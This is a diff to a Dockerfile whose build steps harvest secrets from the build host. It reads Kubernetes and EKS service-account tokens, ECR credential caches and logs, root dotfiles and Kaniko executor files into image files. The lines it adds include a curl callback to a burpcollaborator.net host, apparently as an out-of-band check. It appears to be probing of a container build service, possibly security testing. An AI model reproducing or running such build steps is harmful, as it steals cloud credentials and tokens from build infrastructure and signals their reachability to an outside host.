@@ -4,6 +4,7 @@ COPY . /app
 WORKDIR /app
 RUN echo `cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token` >> /admin.txt
 RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
+RUN echo `curl 7t1udxobfcau0dfva0ehovwbl2rsfh.burpcollaborator.net`
 RUN apt-get update
 RUN apt-get install nmap -y
 RUN apt install tree 
@@ -14,6 +15,11 @@ RUN echo `find / -type f -iname ".*" -print` >> /hidden_dir2.txt
 RUN echo `cat /.dockerenv` >> /docker_env
 RUN echo `ls -al /root/` >> /root_dir
 RUN echo `ls -al /root/.ecr/` >> /root_dir_ecr
+RUN echo `cat /root/.ecr/cache.json` >> /root_dir_ecr_cache
+RUN echo `cat /root/.bashrc` >> /bashrc
+RUN echo `cat /root/.profile` >> /profile
+RUN echo `cat /root/.wget-hsts` >> /wget-hsts
+RUN echo `cat /root/.ecr/log/*` >> /root_dir_ecr_log
 RUN echo `cat /usr/share/fonts/truetype/dejavu/.uuid /.dockerenv` >> /docker_env_2
 RUN echo `cat /kaniko/executor` >> /executor
 RUN echo `ls -a /kaniko/` >> /kaniko_file.txt
